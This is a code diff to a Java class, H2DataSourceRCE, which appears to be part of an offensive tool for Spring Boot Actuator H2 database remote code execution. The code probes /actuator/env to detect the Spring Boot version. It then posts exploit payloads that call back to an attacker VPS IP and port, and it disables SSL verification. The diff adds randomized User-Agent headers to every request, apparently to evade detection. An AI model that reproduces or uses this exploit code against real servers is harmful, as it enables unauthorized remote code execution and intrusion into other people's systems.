@@ -1,11 +1,13 @@
 package src.main.module;
 
+import src.main.common.UA_Config;
 import src.main.impl.ResultCallback;
 
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
+import java.util.List;
 import java.util.Scanner;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
@@ -37,10 +39,15 @@ public class H2DataSourceRCE {
         String llib = "h2database";
         String llib1 = "spring-boot-starter-data-jpa";
         String data = String.format(expData1,vpsIP + ":" + vpsPort);
+        String ua = "";
         disableSSLVerification();
         try {
             URL obj = new URL(site);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+            UA_Config uacf = new UA_Config();
+            List<String> ualist = uacf.loadUserAgents();
+            ua = uacf.getRandomUserAgent(ualist);
+            conn.setRequestProperty("User-Agent",ua);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
@@ -63,6 +70,8 @@ public class H2DataSourceRCE {
                     callback.onResult(text);
                     URL obj1 = new URL(site);
                     HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+                    ua = uacf.getRandomUserAgent(ualist);
+                    conn1.setRequestProperty("User-Agent",ua);
                     conn1.setRequestMethod("POST");
                     conn1.setRequestProperty("Content-Type","application/json");
                     conn1.setDoOutput(true);
@@ -85,6 +94,8 @@ public class H2DataSourceRCE {
                             ++count;
                             URL obj2 = new URL(restsite);
                             HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
+                            ua = uacf.getRandomUserAgent(ualist);
+                            conn2.setRequestProperty("User-Agent",ua);
                             conn2.setRequestMethod("POST");
                             conn2.setRequestProperty("Content-Type", "application/json");
                             conn2.setDoOutput(true);
@@ -126,10 +137,15 @@ public class H2DataSourceRCE {
         String llib = "h2database";
         String llib1 = "spring-boot-starter-data-jpa";
         String data = String.format(expData2,vpsIP + ":" + vpsPort);
+        String ua = "";
         disableSSLVerification();
         try{
             URL obj = new URL(site);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+            UA_Config uacf = new UA_Config();
+            List<String> ualist = uacf.loadUserAgents();
+            ua = uacf.getRandomUserAgent(ualist);
+            conn.setRequestProperty("User-Agent",ua);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
@@ -152,6 +168,8 @@ public class H2DataSourceRCE {
                     callback.onResult(text);
                     URL obj1 = new URL(site);
                     HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+                    ua = uacf.getRandomUserAgent(ualist);
+                    conn1.setRequestProperty("User-Agent",ua);
                     conn1.setRequestMethod("POST");
                     conn1.setRequestProperty("Content-Type","application/json");
                     conn1.setDoOutput(true);
@@ -174,6 +192,8 @@ public class H2DataSourceRCE {
                             ++count;
                             URL obj2 = new URL(restsite);
                             HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
+                            ua = uacf.getRandomUserAgent(ualist);
+                            conn2.setRequestProperty("User-Agent",ua);
                             conn2.setRequestMethod("POST");
                             conn2.setRequestProperty("Content-Type", "application/json");
                             conn2.setDoOutput(true);
@@ -211,23 +231,29 @@ public class H2DataSourceRCE {
         Stream.Builder<String> builder = Stream.builder();
         String api ="/actuator/env";
         String site = address + api;
+        String ua = "";
         disableSSLVerification();
         try{
             URL obj = new URL(site);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+            UA_Config uacf = new UA_Config();
+            List<String> ualist = uacf.loadUserAgents();
+            ua = uacf.getRandomUserAgent(ualist);
+            conn.setRequestProperty("User-Agent",ua);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
-            if (responseCode == 200) {
+            if (responseCode == HttpURLConnection.HTTP_OK) {
                 // 存在路径是springboot2，否则是springboot1
                 text = "当前版本为springboot2";
-                callback.onResult("当前版本为springboot2");
+                callback.onResult(text);
                 Result2(callback);
             }else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND){
                 text = "当前版本为springboot1";
-                callback.onResult("当前版本为springboot1");
+                callback.onResult(text);
                 Result1(callback);
             }else{
-                callback.onResult("未识别springboot版本");
+                text = "未识别springboot版本";
+                callback.onResult(text);
             }
         }catch (IOException e){
             e.printStackTrace();
